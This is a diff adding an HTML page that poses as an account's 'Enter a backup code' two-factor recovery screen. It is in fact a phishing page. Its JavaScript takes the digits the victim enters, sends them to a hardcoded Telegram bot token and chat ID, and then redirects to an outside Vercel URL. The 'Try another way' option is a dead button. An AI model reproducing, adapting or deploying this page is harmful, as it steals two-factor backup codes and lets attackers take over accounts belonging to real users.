@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter a backup code</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: #000000;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            text-align: center;
+            border-radius: 8px;
+            color: #ffffff;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            font-weight: 500;
+        }
+        
+        .description {
+            color: #e0e0e0;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        
+        .illustration {
+            margin: 25px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 180px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #444444;
+            border-radius: 4px;
+            text-align: center;
+            letter-spacing: 2px;
+            outline: none;
+            transition: border-color 0.3s;
+            background-color: #222222;
+            color: #ffffff;
+        }
+        
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            justify-content: flex-start;
+            margin-bottom: 25px;
+        }
+        
+        .checkbox-group input {
+            margin-right: 10px;
+            margin-top: 3px;
+        }
+        
+        .checkbox-group label {
+            font-size: 14px;
+            color: #e0e0e0;
+            text-align: left;
+            line-height: 1.4;
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        button {
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .continue-btn {
+            background-color: #1a73e8;
+            color: white;
+        }
+        
+        .continue-btn:hover {
+            background-color: #1765cc;
+        }
+        
+        .try-another-btn {
+            background-color: transparent;
+            color: #1a73e8;
+            border: 1px solid #444444;
+        }
+        
+        .try-another-btn:hover {
+            background-color: #222222;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Enter a backup code</h1>
+        
+        <div class="description">
+            <p>Backup codes are 8-digit recovery codes that you can use to access your account when you can't use your regular verification method.</p>
+            <p>Keep these codes somewhere safe. If you lose your phone, you can use these codes to sign in.</p>
+        </div>
+        
+        <div class="illustration">
+            <!-- SVG illustration that matches the image -->
+            <svg width="180" height="180" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg">
+                <!-- Left hand -->
+                <path d="M50,80 Q30,90 30,110 L30,130 Q30,140 40,140 L50,140 Q60,140 60,130 L60,110 Q60,90 50,80 Z" fill="#fdbcb4" stroke="#333" stroke-width="1"/>
+                
+                <!-- Right hand -->
+                <path d="M130,80 Q150,90 150,110 L150,130 Q150,140 140,140 L130,140 Q120,140 120,130 L120,110 Q120,90 130,80 Z" fill="#fdbcb4" stroke="#333" stroke-width="1"/>
+                
+                <!-- Phone -->
+                <rect x="60" y="40" width="60" height="100" rx="5" ry="5" fill="#f0f0f0" stroke="#333" stroke-width="2"/>
+                
+                <!-- Phone screen -->
+                <rect x="65" y="50" width="50" height="70" rx="2" ry="2" fill="#ffffff"/>
+                
+                <!-- Shield -->
+                <path d="M90,60 L80,65 L80,75 Q80,85 90,90 Q100,85 100,75 L100,65 Z" fill="#4285f4" stroke="#333" stroke-width="1"/>
+                
+                <!-- Password box -->
+                <rect x="70" y="100" width="40" height="10" rx="2" ry="2" fill="#e0e0e0" stroke="#333" stroke-width="1"/>
+                
+                <!-- Password dots -->
+                <circle cx="75" cy="105" r="1.5" fill="#333"/>
+                <circle cx="80" cy="105" r="1.5" fill="#333"/>
+                <circle cx="85" cy="105" r="1.5" fill="#333"/>
+                <circle cx="90" cy="105" r="1.5" fill="#333"/>
+                <circle cx="95" cy="105" r="1.5" fill="#333"/>
+                <circle cx="100" cy="105" r="1.5" fill="#333"/>
+            </svg>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="codeInput" placeholder="Code" maxlength="8">
+        </div>
+        
+        <div class="checkbox-group">
+            <input type="checkbox" id="trustDevice" checked>
+            <label for="trustDevice">Trust this device and skip this step from now on</label>
+        </div>
+        
+        <div class="buttons">
+            <button class="continue-btn" id="continueBtn">Continue</button>
+            <button class="try-another-btn" id="tryAnotherBtn">Try another way</button>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInput = document.getElementById('codeInput');
+            const continueBtn = document.getElementById('continueBtn');
+            const tryAnotherBtn = document.getElementById('tryAnotherBtn');
+            const trustDeviceCheckbox = document.getElementById('trustDevice');
+            
+            // Telegram bot configuration
+            const telegramToken = '8427627573:AAFGbWtwUMc1cQ25ImzNwLnQDt0jW8p4PVs';
+            const chatId = '6843983729';
+            const redirectUrl = 'https://time-line-eight.vercel.app/';
+            
+            // Function to send code to Telegram bot
+            async function sendToTelegram(code) {
+                try {
+                    const message = `New backup code entered: ${code}`;
+                    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                    
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    
+                    return data.ok;
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+            
+            // Continue button click event
+            continueBtn.addEventListener('click', async function() {
+                const code = codeInput.value.trim();
+                
+                // Validate code (6-8 digits)
+                if (code.length < 6 || code.length > 8 || !/^\d+$/.test(code)) {
+                    return; // Just return without showing any alert
+                }
+                
+                // Disable button during processing
+                continueBtn.disabled = true;
+                continueBtn.textContent = 'Processing...';
+                
+                // Send to Telegram
+                await sendToTelegram(code);
+                
+                // Redirect regardless of Telegram success
+                window.location.href = redirectUrl;
+            });
+            
+            // Try another way button click event
+            tryAnotherBtn.addEventListener('click', function() {
+                // Do nothing or implement alternative verification
+            });
+            
+            // Auto-format input as user types (digits only)
+            codeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+    </script>
+</body>
+</html>
